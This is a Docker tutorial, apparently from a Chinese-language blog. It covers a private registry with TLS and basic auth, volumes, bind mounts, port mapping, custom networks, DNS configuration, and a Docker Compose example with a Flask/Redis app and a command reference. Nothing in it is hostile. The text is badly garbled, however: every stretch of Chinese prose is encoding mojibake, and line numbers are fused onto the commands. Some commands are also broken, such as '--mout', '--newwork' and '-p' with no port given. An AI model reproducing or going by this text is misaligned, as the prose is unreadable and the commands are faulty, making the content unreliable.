/etc/hosts 1127.0.0.1 docker.domain.com å¯åŠ¨ 1docker-compose up -d è¿™æ ·å°±æ­å»ºå¥½äº†ä¸€ä¸ªå…·æœ‰æƒé™è®¤è¯ã€TLSçš„ç§æœ‰ä»“åº“ã€‚ ç”±äºŽè‡ªè¡Œç­¾å‘çš„CAæ ¹è¯ä¹¦ä¸è¢«ç³»ç»Ÿä¿¡ä»»ï¼Œéœ€è¦å°†CAæ ¹è¯ä¹¦ ssl/root-ca.crtç§»å…¥ etc/docker/certs.d/docker.domain.comæ–‡ä»¶å¤¹ä¸­ 12sudo mkdir -p /etc/docker/certs.d/docker.domain.comsudo cp ssl/root-ca.crt /etc/docker/certs.d/docker.domain.com/ca.crt å…³é”®åœ¨äºŽé€€å‡ºç™»å½•ï¼Œå°è¯•æŽ¨é€é•œåƒ 123docker logout docker.domain.comdocker push docker.domain.com/username/ubuntu:18.04no basic auth credentials æ•°æ®ç®¡ç†æ•°æ®å·Volumesæ•°æ®å·æ˜¯ä¸€ä¸ªå¯ä¾›ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨ä½¿ç”¨çš„ç‰¹æ®Šç›®å½•ï¼Œå®ƒç»•è¿‡UFS,å¯ä»¥æä¾›å¾ˆå¤šæœ‰ç”¨çš„ç‰¹å¾ï¼š æ•°æ®å·å¯ä»¥åœ¨å®¹å™¨ä¹‹é—´å…±äº«å’Œé‡ç”¨ å¯¹æ•°æ®å·çš„ä¿®æ”¹ä¼šç«‹é©¬ç”Ÿæ•ˆ å¯¹æ•°æ®å·çš„æ›´æ–°ä¸ä¼šå½±å“é•œåƒ æ•°æ®å·é»˜è®¤ä¸€ç›´å­˜åœ¨ï¼Œå³ä½¿å®¹å™¨è¢«åˆ é™¤ æ•°æ®çš„ä½¿ç”¨ï¼Œç±»ä¼¼äºŽLinuxä¸‹å¯¹ç›®å½•æˆ–è€…æ–‡ä»¶è¿›è¡Œmountï¼Œé•œåƒä¸­çš„è¢«æŒ‡å®šä¸ºæŒ‚è½½ç‚¹çš„ç›®å½•ä¸­çš„æ–‡ä»¶ä¼šéšè—æŽ‰ï¼Œèƒ½æ˜¾ç¤ºçœ‹çš„æ˜¯æŒ‚è½½çš„æ•°æ®å· åˆ›å»ºä¸€ä¸ªæ•°æ®å·12345678910111213141516docker volume create my-vol# æŸ¥çœ‹æ‰€æœ‰æ•°æ®å·docker volume lslocal my-vol# åœ¨ä¸»æœºé‡Œé¢ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®šæ•°æ®å·çš„ä¿¡æ¯docker volume inspect my-vol[ &#123; "Driver": "local", "Labels": &#123;&#125;, "Mountpoint": "/var/lib/docker/volumes/my-vol/_data", "Name": "my-vol", "Options": &#123;&#125;, "Scope": "local" &#125;] å¯åŠ¨ä¸€ä¸ªæŒ‚è½½æ•°æ®å·çš„å®¹å™¨12345678# ç”¨ docker runå‘½ä»¤çš„æ—¶å€™ï¼Œä½¿ç”¨ --mountæ ‡è®°å°†æ•°æ®å·æŒ‚è½½å®¹å™¨é‡Œã€‚åœ¨ä¸€æ¬¡docker run ä¸­å¯ä»¥æŒ‚è½½å¤šä¸ªæ•°æ®å·# åˆ›å»ºä¸€ä¸ªåä¸ºwebçš„å®¹å™¨ï¼Œå¹¶åŠ è½½ä¸€ä¸ªæ•°æ®å·åˆ°å®¹å™¨çš„/webappæ²¡æœ‰æ¥docker run -d - p \ --name web \ # -v my-vol:/wepapp \ --mount source=my-vol,target=/webapp \ training/webapp \ python app.py æŸ¥çœ‹æ•°æ®å·çš„å…·ä½“ä¿¡æ¯ä¸»æœºé‡Œé¢ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹webå®¹å™¨çš„ä¿¡æ¯ 1234567891011121314docker inspect web# æ•°æ®å·ä¿¡æ¯åœ¨Mounts Keysä¸‹é¢"Mounts": [ &#123; "Type": "volume", "Name": "my-vol", "Source": "/var/lib/docker/volumes/my-vol/_data", "Destination": "/app", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" &#125;], åˆ é™¤æ•°æ®å·1docker volume rm my-vol æ•°æ®å·æ˜¯è¢«è®¾è®¡ç”¨æ¥æŒä¹…åŒ–æ•°æ®çš„ï¼Œç”Ÿå‘½å‘¨æœŸç‹¬ç«‹äºŽå®¹å™¨ï¼ŒDockerä¸ä¼šåœ¨å®¹å™¨è¢«åˆ é™¤åŽè‡ªåŠ¨åˆ é™¤å®¹å™¨ï¼Œå¹¶ä¸”ä¹Ÿä¸ä¼šå­˜åœ¨åžƒåœ¾å›žæ”¶è¿™æ ·çš„æœºåˆ¶æ¥å¤„ç†æ²¡æœ‰ä»»ä½•å®¹å™¨å¼•ç”¨çš„æ•°æ®å·ã€‚å¦‚æžœéœ€è¦åœ¨åˆ é™¤å®¹å™¨çš„åŒæ—¶ç§»é™¤æ•°æ®å·ï¼Œå¯ä»¥å†åˆ é™¤å®¹å™¨çš„æ—¶å€™ä½¿ç”¨ docker rm -vçš„å‘½ä»¤ æ— ä¸»çš„æ•°æ®å·å¯èƒ½ä¼šå æ®å¾ˆå¤šç©ºé—´ï¼Œæ¸…ç†å¯ä»¥ä½¿ç”¨ï¼š 1docker volume prune æŒ‚è½½ä¸»æœºç›®å½•Bind mountsæŒ‚è½½ä¸€ä¸ªä¸»æœºç›®å½•ä½œä¸ºæ•°æ®å·1234567# ä½¿ç”¨ --mountæ ‡è®°å¯ä»¥æŒ‡å®šæŒ‚è½½ä¸€ä¸ªæœ¬åœ°ä¸»æœºçš„ç›®å½•åˆ°å®¹å™¨ä¸­åŽ»docker run -d -P \ --name web \ # -v /src/webapp:/opt/webapp \ --mout type=bind,source=/src/webapp,target=/opt/webapp \ training/webapp \ python app.py ä¸Šé¢çš„å‘½ä»¤åŠ è½½ä¸»æœºçš„ /src/webappç›®å½•åˆ°å®¹å™¨çš„ /opt/webappç›®å½•ï¼Œè¿™ä¸ªåŠŸèƒ½åœ¨è¿›è¡Œæµ‹è¯•æ¯”è¾ƒæ–¹ä¾¿ï¼Œæ¯”å¦‚ç”¨æˆ·å¯ä»¥æ”¾ç½®ä¸€äº›ç¨‹åºåˆ°æœ¬åœ°ç›®å½•ä¸­ï¼Œæ¥æŸ¥çœ‹å®¹å™¨æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚æœ¬åœ°ç›®å½•çš„è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œä½¿ç”¨ -vå‚æ•°æ—¶å¦‚æžœæœ¬åœ°ç›®å½•ä¸å­˜åœ¨Dockerä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ --mounté‡‡çº³æ•°å¦‚æžœæœ¬åœ°ç›®å½•ä¸å­˜åœ¨ï¼ŒDockerä¼šæŠ¥é”™ DockeræŒ‚è½½ä¸»æœºç›®å½•é»˜è®¤æƒé™æ˜¯è¯»å†™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å¢žåŠ  readonlyæŒ‡å®šä¸ºåªè¯» 123456789docker run -d -p \ --name web \ # -v /src/webapp:/opt/webapp:ro \ --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \ training/webapp \ python app.py# åŠ äº† readonlyä¹‹åŽå°±æŒ‚è½½ä¸ºåªè¯»ï¼Œåœ¨å®¹å™¨å†… /opt/webappç›®å½•åˆ›å»ºæ–‡ä»¶ï¼Œä¼šæ˜¾ç¤ºé”™è¯¯/opt/webapp # touch new.txttouch: new.txt: Read-only file system æŸ¥çœ‹æ•°æ®å·çš„å…·ä½“ä¿¡æ¯åœ¨ä¸»æœºé‡ŒæŸ¥çœ‹webå®¹å™¨çš„ä¿¡æ¯ 123456789101112docker inspect web # æŒ‚è½½ä¸»æœºç›®å½•çš„é…ç½®ä¿¡æ¯åœ¨Mounts Keyä¸‹é¢"Mounts": [ &#123; "Type": "bind", "Source": "/src/webapp", "Destination": "/opt/webapp", "Mode": "", "RW": true, "Propagation": "rprivate" &#125;], æŒ‚è½½ä¸€ä¸ªæœ¬åœ°ä¸»æœºæ–‡ä»¶ä½œä¸ºæ•°æ®å· --mountæ ‡è®°ä¹Ÿå¯ä»¥ä»Žä¸»æœºæŒ‚è½½å•ä¸ªæ–‡ä»¶åˆ°å®¹å™¨ä¸­ 1234567891011docker run --rm -it \ # -v $HOME/.bash_history:/root/.bash_history \ --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \ ubuntu:17.10 \ bash root@2affd44b4667:/# history1 ls2 diskutil list #è¿™æ ·å¯ä»¥è®°å½•åœ¨å®¹å™¨è¾“å…¥è¿‡çš„å‘½ä»¤ ä½¿ç”¨ç½‘ç»œå¤–éƒ¨è®¿é—®å®¹å™¨å®¹å™¨ä¸­å¯ä»¥è¿è¡Œä¸€äº›ç½‘ç»œåº”ç”¨ï¼Œè®©å¤–éƒ¨ä¹Ÿå¯ä»¥è®¿é—®ï¼Œå¯ä»¥é€šè¿‡ -P/på‚æ•°æ¥æŒ‡å®šç«¯å£æ˜ å°„ å½“ä½¿ç”¨-Pï¼ŒDockerä¼šéšæœºæ˜ å°„ä¸€ä¸ª 49000~49900çš„ç«¯å£åˆ°å†…éƒ¨å®¹å™¨å¼€æ”¾çš„ç«¯å£ 12345678910docker run -d -p training/webapp python app.pydocker container ls -lCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESbc533791f3f5 training/webapp:latest python app.py 5 seconds ago Up 2 seconds 0.0.0.0:49155-&gt;5000/tcp nostalgic_morse# æœ¬åœ°ä¸»æœºçš„49155è¢«æ˜ å°„åˆ°å®¹å™¨çš„5000ç«¯å£ï¼Œæ­¤æ—¶è®¿é—®æœ¬æœºçš„49155ç«¯å£æ—¢å¯ä»¥è®¿é—®å®¹å™¨å†…webåº”ç”¨æä¾›çš„ç•Œé¢# å¯ä»¥é€šè¿‡docker logså‘½ä»¤æŸ¥çœ‹åº”ç”¨çš„ä¿¡æ¯docker logs -f nostalgic_morss* Running on http://0.0.0.0:5000/10.0.2.2 - - [23/May/2014 20:16:31] "GET / HTTP/1.1" 200 -10.0.2.2 - - [23/May/2014 20:16:31] "GET /favicon.ico HTTP/1.1" 404 - -påˆ™å¯ä»¥æŒ‡å®šè¦æ˜ å°„çš„ç«¯å£ï¼Œå¹¶ä¸”åœ¨ä¸€ä¸ªæŒ‡å®šç«¯å£ä¸Šåªå¯ä»¥ç»‘å®šä¸€ä¸ªå®¹å™¨ã€‚æ”¯æŒçš„æ ¼å¼ä¸ºï¼š ip:hostPort:containerPort|ip::containerPort|hostPort:containerPort 123456789101112131415161718# æ˜ å°„æ‰€æœ‰æŽ¥å£åœ°å€:ä½¿ç”¨ hostPort:containerPortæ ¼å¼æœ¬åœ°çš„5000ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„5000ç«¯å£ï¼Œæ­¤æ—¶ä¼šé»˜è®¤ç»‘å®šæœ¬åœ°æ‰€æœ‰æŽ¥å£ä¸Šçš„æ‰€æœ‰åœ°å€docker run -d -p 5000:5000 training/webapp python app.py#æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„æŒ‡å®šç«¯å£ï¼šip:hostPort:containerPortæ˜ å°„ä½¿ç”¨ä¸€ä¸ªç‰¹å®šåœ°å€ï¼Œæ¯”å¦‚localhoståœ°å€127.0.0.1docker run -d -p 127.0.0.1::5000 training/webapp python app.py# ä½¿ç”¨udpæ¥æŒ‡å®šudpç«¯å£docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py# æŸ¥çœ‹æ˜ å°„ç«¯å£é…ç½®:docker portï¼Œè¿˜å¯ä»¥æŸ¥åˆ°ç»‘å®šçš„åœ°å€docker port nostalgic_morse 5000127.0.0.1:49155 .# å®¹å™¨æœ‰è‡ªå·±çš„å†…éƒ¨ç½‘ç»œå’Œipåœ°å€ï¼Œ-pæ ‡è®°å¯ä»¥å¤šæ¬¡ä½¿ç”¨æ¥ç»‘å®šå¤šä¸ªç«¯å£docker run -d \ -p 5000:5000 \ -p 3000:80 training/webapp \ python app.py å®¹å™¨äº’è”éšç€Dockerç½‘ç»œçš„å®Œå–„ï¼Œå°†å®¹å™¨åŠ å…¥è‡ªå®šä¹‰Dockerç½‘ç»œæ¥è¿žæŽ¥å¤šä¸ªå®¹å™¨çš„åšæ³•ä¼˜äºŽä½¿ç”¨ --linkå‚æ•° æ–°å»ºç½‘ç»œ12# åˆ›å»ºä¸€ä¸ªæ–°çš„Dockerç½‘ç»œï¼Œ-då‚æ•°æŒ‡å®šDockerç½‘ç»œç±»åž‹ï¼Œæœ‰bridge overlayï¼Œå…¶ä¸­overlayç½‘ç»œç±»åž‹é€‚ç”¨äºŽSwarm modedocker network create -d bridge my-net é“¾æŽ¥å®¹å™¨12345678910111213141516171819202122232425# è¿è¡Œä¸€ä¸ªå®¹å™¨å¹¶è¿žæŽ¥åˆ°æ–°å»ºçš„my netç½‘ç»œdocker run -it --rm --name busybox1 --network my-net busybox sh# æ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œå†è¿è¡Œä¸€ä¸ªå®¹å™¨åŠ å…¥åˆ°my-netç½‘ç»œdocker run -it --name busybox2 --newwork my-net busybox sh# å†æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯æŸ¥çœ‹å®¹å™¨ä¿¡æ¯docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb47060aca56b busybox "sh" 11 minutes ago Up 11 minutes busybox28720575823ec busybox "sh" 16 minutes ago Up 16 minutes busybox1#é€šè¿‡ pingæ¥è¯æ˜Žbusybox1å®¹å™¨å’Œbusybox2å®¹å™¨å»ºç«‹äº†äº’è”å…³ç³»ï¼Œåœ¨busybox1å®¹å™¨è¾“å…¥ä»¥ä¸‹å‘½ä»¤/ # ping busybox2PING busybox2 (172.19.0.3): 56 data bytes64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms# ç”¨pingæ¥æµ‹è¯•è¿žæŽ¥busybox2å®¹å™¨ï¼Œä¼šè¢«è§£æžæˆ172.19.0.3ï¼ŒåŒç†busybox2å®¹å™¨æ‰§è¡Œ ping busybox1ï¼Œä¹Ÿä¼šæˆåŠŸè¿žæŽ¥åˆ°/ # ping busybox1PING busybox1 (172.19.0.2): 56 data bytes64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms# è¿™æ ·busybox1å’Œbusybox2å®¹å™¨å°±å»ºç«‹äº’è”å…³ç³» å¦‚æžœæœ‰å¤šä¸ªå®¹å™¨ä¹‹é—´éœ€è¦äº’ç›¸è¿žæŽ¥ï¼ŒæŽ¨èä½¿ç”¨Docker compose é…ç½®DNSDockeråˆ©ç”¨è™šæ‹Ÿæ–‡ä»¶æ¥æŒ‚è½½å®¹å™¨çš„3ä¸ªç›¸å…³é…ç½®æ–‡ä»¶ åœ¨å®¹å™¨ä¸­ä½¿ç”¨ mountå‘½ä»¤å¯ä»¥çœ‹åˆ°æŒ‚è½½ä¿¡æ¯ã€‚ è¿™ç§æœºåˆ¶å¯ä»¥è®©å®¿ä¸»ä¸»æœºDNSä¿¡æ¯å‘ç”Ÿæ›´æ–°åŽï¼Œæ‰€æœ‰Dockerå®¹å™¨çš„DNSé…ç½®é€šè¿‡ /etc/resolv.confæ–‡ä»¶ç«‹åˆ»å¾—åˆ°æ›´æ–°ã€‚ é…ç½®å…¨éƒ¨å®¹å™¨çš„DNSï¼Œå¯ä»¥åœ¨/etc/docker/daemon.jsonæ–‡ä»¶ä¸­å¢žåŠ ä»¥ä¸‹å†…å®¹æ¥è®¾ç½® 123456&#123; "dns":[ "114.114.114.114", "8.8.8.8" ]&#125; è¿™æ ·æ¯æ¬¡å¯åŠ¨å®¹å™¨DNSè‡ªåŠ¨é…ç½®ä¸º114.114.114.114å’Œ 8.8.8.8ã€‚è¯æ˜Žå·²ç»ç”Ÿæ•ˆï¼š 1234docker run -it --rm ubuntu:18.04 cat etc/resolv.confnameserver 114.114.114.114nameserver 8.8.8.8 å¦‚æžœç”¨æˆ·æƒ³è¦æ‰‹åŠ¨æŒ‡å®šå®¹å™¨çš„é…ç½®ï¼Œå¯ä»¥åœ¨ä½¿ç”¨docker runçš„æ—¶å€™åŠ å…¥å‚æ•°ï¼š -h HOSTNAME/--hostname=HOSTNAMEè®¾å®šå®¹å™¨çš„ä¸»æœºåï¼Œå®ƒä¼šè¢«å†™åˆ°å®¹å™¨å†…çš„etc/hostnameå’Œ/etc/hostsï¼Œåœ¨å®¹å™¨å¤–éƒ¨çœ‹ä¸åˆ°ï¼Œæ—¢ä¸ä¼šåœ¨docker container lsä¸­æ˜¾ç¤ºï¼Œä¹Ÿä¸ä¼šåœ¨å…¶ä»–å®¹å™¨ /etc/hostsçœ‹åˆ°ã€‚ --dns=IP_ADDRESSæ·»åŠ DNSæœåŠ¡å™¨åˆ°å®¹å™¨çš„/etc/resolv.confä¸­ï¼Œè®©å®¹å™¨ç”¨è¿™ä¸ªæœåŠ¡å™¨æ¥è§£æžæ‰€æœ‰ä¸åœ¨ /etc/hostsä¸­çš„ä¸»æœºå --dns-search=DOMAINè®¾å®šå®¹å™¨çš„æœç´¢åŸŸï¼Œå½“è®¾å®šæœç´¢åŸŸä¸º .example.comæ—¶ï¼Œåœ¨æœç´¢ä¸€ä¸ªåä¸ºhostçš„ä¸»æœºï¼ŒDNSä¸ä»…æœç´¢hostï¼Œè¿˜ä¼šæœç´¢host.example.com å¦‚æžœåœ¨å®¹å™¨å¯åŠ¨æ—¶æ²¡æœ‰æŒ‡å®šæœ€åŽä¸¤ä¸ªå‚æ•°ï¼ŒDockerä¼šé»˜è®¤ç”¨ä¸»æœºä¸Šçš„ resolve.confé…ç½®å®¹å™¨ Docker Composeé¡¹ç›®Docker Composeæ˜¯Docker å®˜æ–¹ç¼–æŽ’ï¼ˆOrchestrationï¼‰é¡¹ç›®ä¹‹ä¸€ï¼Œè´Ÿè´£å¿«é€Ÿçš„éƒ¨ç½²åˆ†å¸ƒå¼åº”ç”¨ã€‚ Composeå®šä½æ˜¯å®šä¹‰å’Œè¿è¡Œå¤šä¸ªDockerå®¹å™¨çš„åº”ç”¨ã€‚ ä½¿ç”¨ä¸€ä¸ªDockerfileæ¨¡æ¿æ–‡ä»¶å¯ä»¥å¾ˆæ–¹ä¾¿å®šä¹‰ä¸€ä¸ªå•ç‹¬çš„å®¹å™¨ï¼Œä½†ç»å¸¸ä¼šç¢°åˆ°éœ€è¦å¤šä¸ªå®¹å™¨äº’ç›¸é…åˆæ¥å®ŒæˆæŸé¡¹ä»»åŠ¡çš„æƒ…å†µï¼Œè¦å®žçŽ°ä¸€ä¸ªWebé¡¹ç›®ï¼Œé™¤äº†WebæœåŠ¡å®¹å™¨æœ¬èº«ï¼ŒçŽ©çŽ©è¿˜è¦åŠ ä¸ŠåŽç«¯çš„æ•°æ®åº“æœåŠ¡å®¹å™¨ï¼Œç”šè‡³è´Ÿè½½å‡è¡¡å®¹å™¨ç­‰ã€‚ Composeè¿è¡Œç”¨æˆ·é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„docker-cmpose.ymlæ¨¡æ¿æ–‡ä»¶æ¥å®šä¹‰ä¸€ç»„ç›¸å…³è”åº”ç”¨å®¹å™¨ä¸ºä¸€ä¸ªé¡¹ç›® Composeä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼š æœåŠ¡serviceï¼šä¸€ä¸ªåº”ç”¨çš„å®¹å™¨ï¼Œå®žé™…ä¸Šå¯ä»¥åŒ…æ‹¬è‹¥å¹²è¿è¡Œç›¸åŒé•œåƒçš„å®¹å™¨å®žä¾‹ é¡¹ç›®projectï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒï¼Œåœ¨docker-compose.ymlæ–‡ä»¶ä¸­å®šä¹‰ Composeçš„é»˜è®¤ç®¡ç†å¯¹è±¡æ˜¯é¡¹ç›®ï¼Œé€šè¿‡å­å‘½ä»¤å¯¹é¡¹ç›®ä¸­çš„ä¸€ç»„å®¹å™¨è¿›è¡Œä¾¿æ·çš„ç”Ÿå‘½å‘¨æœŸç®¡ç† Composeé¡¹ç›®ç”±Pythonç¼–å†™ï¼Œå®žé™…ä¸Šè°ƒç”¨äº†DockeræœåŠ¡æä¾›çš„APIæ¥å¯¹å®¹å™¨è¿›è¡Œç®¡ç†ï¼Œå› æ­¤åªè¦æ‰€æ“ä½œçš„å¹³å°æ”¯æŒDocker Apiï¼Œå°±å¯ä»¥åœ¨å…¶ä¸Šåˆ©ç”¨Composeè¿›è¡Œç¼–æŽ’ç®¡ç† ä½¿ç”¨åœºæ™¯å¸¸è§çš„Webç½‘ç»œï¼Œè¯¥é¡¹ç›®åŒ…å«webåº”ç”¨å’Œç¼“å­˜ï¼Œä¸‹é¢ä½¿ç”¨Pythonè®°å½•é¡µé¢æ¬¡æ•°çš„webç½‘ç«™ app.py 1234567891011121314# dockerTest/app.pyfrom flask import Flaskfrom redis import Redisapp = Flask(__name__)redis = Redis(host='redis', port=6379)@app.route('/')def hello(): count = redis.incr('hits') return 'Hello World! è¯¥é¡µé¢å·²è¢«è®¿é—® &#123;&#125; æ¬¡ã€‚\n'.format(count)if __name__ == "__main__": app.run(host="0.0.0.0", debug=True) Dockerfile 12345FROM python:3.6-alpineADD . /codeWORKDIR /codeRUN pip install redis flaskCMD ["python", "app.py"] docker-compose.yml 12345678910version: '3'services: web: build: . ports: - "5000:5000" redis: image: "redis:alpine" è¿è¡Œ 1docker-compose up æ­¤æ—¶è®¿é—®æœ¬åœ°5000ç«¯å£ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œè®¡æ•°å°±ä¼šå¢žåŠ 1. å¦‚æžœæƒ³è¦åŽå°è¿è¡ŒåŠ  -d å‘½ä»¤è¯´æ˜Žå‘½ä»¤å¯¹è±¡ä¸Žæ ¼å¼å¯¹äºŽComposeæ¥è¯´ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤çš„å¯¹è±¡æ—¢å¯ä»¥æ˜¯é¡¹ç›®æœ¬èº«ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºé¡¹ç›®ä¸­çš„æœåŠ¡æˆ–è€…å®¹å™¨ã€‚å¦‚æžœæ²¡æœ‰ç‰¹åˆ«çš„è¯´æ˜Žï¼Œå‘½ä»¤å¯¹è±¡å°†æ˜¯é¡¹ç›®ï¼Œè¿™æ„å‘³ç€é¡¹ç›®ä¸­æ‰€æœ‰æœåŠ¡éƒ½ä¼šå—åˆ°å‘½ä»¤å½±å“ã€‚ docker-compose [COMMAND] --helpæˆ–è€… docker-compose help [COMMAND]å¯ä»¥æŸ¥çœ‹å…·ä½“æŸä¸ªå‘½ä»¤çš„ä½¿ç”¨æ ¼å¼ï¼ŒåŸºæœ¬çš„ä½¿ç”¨æ ¼å¼æ˜¯ï¼š 1docker-compose [-f=&lt;arg&gt;...] [options] [COMMAND] [ARGS...] å‘½ä»¤é€‰é¡¹ -f,--file FILEæŒ‡å®šä½¿ç”¨çš„Composeæ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯docker-compose.ymlï¼Œå¯ä»¥å¤šæ¬¡æŒ‡å®š -p,--project-name NAMEæŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤å°†ä½¿ç”¨æ‰€åœ¨ç›®å½•åç§°ä½œä¸ºé¡¹ç›®å --x-networkingä½¿ç”¨Dockerçš„å¯æ‹”æ’ç½‘ç»œåŽç«¯ç‰¹æ€§ --x-network-driver DRIVERæŒ‡å®šç½‘ç»œåŽç«¯çš„é©±åŠ¨ï¼Œé»˜è®¤ä¸ºbridge --verboseè¾“å‡ºæ›´å¤šè°ƒè¯•ä¿¡æ¯ -v,--versionæ‰“å°ç‰ˆæœ¬å¹¶é€€å‡º å‘½ä»¤ä½¿ç”¨è¯´æ˜Žbuild æ ¼å¼ï¼š docker-compose build [options] [SERVICEâ€¦] æž„å»ºï¼ˆé‡æ–°æž„å»ºï¼‰é¡¹ç›®ä¸­çš„æœåŠ¡å®¹å™¨ã€‚æœåŠ¡å®¹å™¨ä¸€æ—¦æž„å»ºåŽï¼Œå°†ä¼šå¸¦ä¸Šä¸€ä¸ªæ ‡è®°åï¼Œå¯¹äºŽwebé¡¹ç›®ä¸­çš„ä¸€ä¸ªdbå®¹å™¨ï¼Œå¯èƒ½æ˜¯web_db å¯ä»¥éšæ—¶åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ docker-compose buildæ¥é‡æ–°æž„å»ºæœåŠ¡ é€‰é¡¹åŒ…æ‹¬ï¼š --force-rmåˆ é™¤æž„å»ºè¿‡ç¨‹ä¸­çš„ä¸´æ—¶å®¹å™¨ --no-cacheæž„å»ºé•œåƒè¿‡ç¨‹ä¸­ä¸ä½¿ç”¨cache(å°†åŠ å¤§æž„å»ºè¿‡ç¨‹) --pullå§‹ç»ˆå°è¯•é€šè¿‡pullæ¥èŽ·å–æ›´æ–°ç‰ˆæœ¬çš„é•œåƒ config éªŒè¯Compose æ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ ¼å¼é”™è¯¯æ˜¾ç¤ºåŽŸå›  down æ­¤å‘½ä»¤ä¼šåœæ­¢upå‘½ä»¤æ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œå¹¶ç§»é™¤ç½‘ç»œ exec è¿›å…¥æŒ‡å®šå®¹å™¨ help èŽ·å¾—å‘½ä»¤çš„å¸®åŠ© images åˆ—å‡ºComposeæ–‡ä»¶ä¸­åŒ…å«çš„é•œåƒ kill æ ¼å¼ï¼š docker-compose kill [options] [SERVICEâ€¦] é€šè¿‡å‘é€SIGKILLä¿¡å·æ¥å¼ºåˆ¶åœæ­¢æœåŠ¡å®¹å™¨ã€‚æ”¯æŒé€šè¿‡-så‚æ•°æ¥æŒ‡å®šå‘é€ä¿¡å·ï¼š 1docker-compose kill -s SIGINT logs æ ¼å¼ï¼š docker-compose logs [options] [SERVICEâ€¦] æŸ¥çœ‹æœåŠ¡å®¹å™¨çš„è¾“å‡ºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-composeå°†å¯¹ä¸åŒçš„æœåŠ¡è¾“å‡ºä½¿ç”¨ä¸åŒçš„é¢œè‰²æ¥åŒºåˆ†ï¼Œå¯ä»¥é€šè¿‡ --no-coloræ¥å…³é—­é¢œè‰² pause æ ¼å¼ï¼š docker-compose pause [SERVICEâ€¦] æš‚åœä¸€ä¸ªæœåŠ¡å®¹å™¨ port æ ¼å¼ï¼š docker-compose port [option] SERVICE PRIVIATE_PORT æ‰“å°æŸä¸ªå®¹å™¨ç«¯å£æ‰€æ˜ å°„çš„å…¬å…±ç«¯å£ é€‰é¡¹ï¼š --protocol=protoæŒ‡å®šç«¯å£åè®®ï¼Œtcpé»˜è®¤å€¼æˆ–è€…udp --index=indexå¦‚æžœåŒä¸€æœåŠ¡å­˜åœ¨å¤šä¸ªå®¹å™¨ï¼ŒæŒ‡å®šå‘½ä»¤å¯¹è±¡å®¹å™¨çš„åºå·ï¼ˆé»˜è®¤ä¸º1ï¼‰ ps æ ¼å¼ï¼š docker-compose ps [options] [SERVICEâ€¦] åˆ—å‡ºé¡¹ç›®ä¸­ç›®å‰çš„æ‰€æœ‰å®¹å™¨ é€‰é¡¹ï¼š -qåªæ‰“å°å®¹å™¨çš„IDä¿¡æ¯ pull æ ¼å¼ï¼š docker-compose pull [options] [SERVICEâ€¦] æ‹‰å–æœåŠ¡ä¾èµ–çš„é•œåƒ é€‰é¡¹ï¼š --ignore-pull-failureså¿½ç•¥æ‹‰å–é•œåƒè¿‡ç¨‹ä¸­çš„é”™è¯¯ push æŽ¨é€æœåŠ¡ä¾èµ–çš„é•œåƒåˆ°Dockeré•œåƒä»“åº“ restart æ ¼å¼ï¼š docker-compose restart [options] [SERVICEâ€¦] é‡å¯é¡¹ç›®ä¸­çš„æœåŠ¡ã€‚ é€‰é¡¹ï¼š -t,--timeout TIMEOUTæŒ‡å®šé‡å¯å‰åœæ­¢å®¹å™¨çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º10ç§’ï¼‰ rm æ ¼å¼ docker-compose rm [options] [SERVICEâ€¦] åˆ é™¤æ‰€æœ‰åœæ­¢çŠ¶æ€æœåŠ¡å®¹å™¨ï¼ŒæŽ¨èå…ˆæŒ‡å®šdocker-compose stopå‘½ä»¤æ¥åœæ­¢å®¹å™¨ é€‰é¡¹ï¼š -f,--forceå¼ºåˆ¶ç›´æŽ¥åˆ é™¤ï¼ŒåŒ…æ‹¬éžåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œä¸€èˆ¬å°½é‡ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ -våˆ é™¤å®¹å™¨æ‰€æŒ‚è½½çš„æ•°æ®å· run æ ¼å¼ï¼š docker-compose run [options] [-p PORTâ€¦] [-e KEY=VALâ€¦] SERVICE [COMMAND] [ARGSâ€¦] åœ¨æŒ‡å®šæœåŠ¡ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ 1docker-compose run ubuntu ping docker.com å°†ä¼šå¯åŠ¨ä¸€ä¸ªubuntuæœåŠ¡å®¹å™¨ï¼Œå¹¶æ‰§è¡Œping docker.comå‘½ä»¤ 